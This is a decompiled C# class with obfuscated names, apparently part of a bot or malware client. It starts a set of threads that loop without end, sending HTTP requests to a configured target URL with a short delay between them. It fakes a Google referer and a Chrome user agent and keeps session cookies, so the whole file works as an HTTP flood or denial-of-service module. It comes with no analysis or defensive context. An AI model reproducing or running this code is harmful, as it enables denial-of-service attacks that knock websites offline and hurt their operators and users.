using System;
using System.Net;
using System.Threading;

internal sealed class Class2
{
	private sealed class Class3
	{
		private string string_0;

		private WebClient webClient_0 = new WebClient();

		private int int_0;

		public Class3(string string_1, int int_1)
		{
			string_0 = string_1;
			int_0 = int_1;
		}

		public void method_0()
		{
			while (true)
			{
				try
				{
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
					httpWebRequest.ContentType = "application/x-www-form-urlencoded";
					httpWebRequest.CookieContainer = cookieContainer_0;
					HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					httpWebResponse.Close();
					Thread.Sleep(int_0);
				}
				catch
				{
					Thread.Sleep(int_0);
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	public static int int_0 = 20;

	public static bool bool_0;

	private static Class3[] class3_0;

	public static int int_1 = 2;

	public static CookieContainer cookieContainer_0;

	public static void smethod_0()
	{
		cookieContainer_0 = new CookieContainer();
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Referer = "http://www.google.com/";
		httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1";
		httpWebRequest.CookieContainer = cookieContainer_0;
		_ = (HttpWebResponse)httpWebRequest.GetResponse();
		Console.WriteLine(cookieContainer_0.Count.ToString());
	}

	public static void smethod_1()
	{
		smethod_0();
		Thread.Sleep(1000);
		thread_0 = new Thread[int_1];
		threadStart_0 = new ThreadStart[int_1];
		class3_0 = new Class3[int_1];
		for (int i = 0; i < int_1; i++)
		{
			class3_0[i] = new Class3(string_0, int_0);
			threadStart_0[i] = class3_0[i].method_0;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
		bool_0 = true;
	}

	public static void smethod_2()
	{
		for (int i = 0; i < int_1; i++)
		{
			try
			{
				thread_0[i].Abort();
				thread_0[i] = null;
				threadStart_0[i] = null;
				class3_0[i] = null;
			}
			catch
			{
			}
		}
		bool_0 = false;
	}
}
